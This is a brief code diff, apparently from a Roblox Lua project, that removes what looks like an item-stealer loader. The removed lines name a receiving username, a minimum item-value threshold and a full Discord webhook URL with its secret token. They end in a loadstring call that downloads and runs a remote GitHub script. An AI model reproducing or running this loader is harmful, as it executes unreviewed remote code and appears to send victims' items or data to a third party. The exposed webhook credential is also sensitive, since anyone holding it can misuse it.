@@ -1,6 +1,1 @@
-Username = "troll_face1707"
-Username2 = "troll_face1707"
-MinimumRAP = 100000
-Webhook = "https://discord.com/api/webhooks/1329974849552121886/vPn_RDwPwVoeJcptoMCk5Bz7zPaIE7Bi6D69uEhc4WwQC9vGBxqKyviNMiVeNaHFDiwj"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bananaHUBv5/ScriptAllGames/refs/heads/main/ScriptAllGames"))()
